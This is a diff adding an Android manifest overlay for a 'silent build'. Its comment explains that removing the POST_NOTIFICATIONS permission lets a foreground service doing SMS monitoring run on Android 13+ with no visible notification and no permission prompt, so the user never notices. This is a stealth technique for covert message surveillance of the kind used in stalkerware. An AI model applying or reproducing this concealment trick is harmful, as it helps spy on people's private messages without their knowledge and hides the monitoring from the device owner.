@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+    <!--
+      The silent build must stay completely unnoticeable.
+
+      A foreground service is still required to keep SMS monitoring alive, and
+      Android still demands a Notification object for it. However, when
+      POST_NOTIFICATIONS is not held, Android 13+ does not display that
+      notification, so the service runs without anything appearing on screen.
+
+      Removing the permission is what makes that happen: without the
+      declaration the permission can never be granted, so the user is never
+      prompted either.
+    -->
+    <uses-permission
+        android:name="android.permission.POST_NOTIFICATIONS"
+        tools:node="remove" />
+
+</manifest>
